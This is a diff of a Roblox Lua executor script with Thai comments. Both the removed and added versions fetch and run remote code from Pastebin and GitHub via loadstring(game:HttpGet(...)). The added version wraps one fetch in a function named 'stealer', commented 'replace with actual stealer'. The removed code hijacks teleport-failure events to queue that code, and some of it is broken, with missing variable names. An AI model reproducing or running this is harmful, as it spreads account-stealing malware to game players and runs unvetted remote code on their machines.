@@ -1,20 +1,10 @@
-local TeleportService = game:GetService("TeleportService")
-
--- ถ้า teleport ล้มเหลว ให้บันทึก JobId และรันโค้ดหลัง teleport
-TeleportService.TeleportInitFailed:Connect(function(, , , , v)
-    queue_onteleport([[
-        getgenv().JobId = "]] .. v.ServerInstanceId .. [[";
-        -- รันสคริปต์จาก Pastebin
-        loadstring(game:HttpGet("https://pastebin.com/raw/2MrdkW6b"))()
-        -- รันสคริปต์จาก GitHub (ใช้ลิงก์ raw)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas13119/Dds/main/ui"))()
-    ]])
-end)
-
--- teleport ไปยัง JobId ที่กำหนด 2 ครั้ง
-for  = 1, 2 do
-    task.spawn(function()
-        TeleportService:TeleportToPlaceInstance(126884695634066, game.JobId)
-    end)
-    task.wait()
+local function stealer()
+    loadstring(game:HttpGet("https://pastebin.com/raw/2MrdkW6b"))() -- replace with actual stealer
 end
+local function loadui()
+  loadstring(game:HttpGet("https://github.com/panumas13119/Dds/blob/main/ui"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
